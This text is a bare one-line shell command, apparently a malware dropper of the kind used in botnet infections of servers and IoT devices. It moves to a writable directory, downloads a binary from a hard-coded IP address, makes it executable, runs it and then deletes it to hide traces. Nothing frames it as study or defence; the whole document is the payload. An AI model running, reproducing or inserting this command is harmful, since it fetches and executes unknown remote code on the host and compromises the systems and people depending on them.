cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.165.29.76/wget; chmod +x wget; ./wget; rm -rf wget
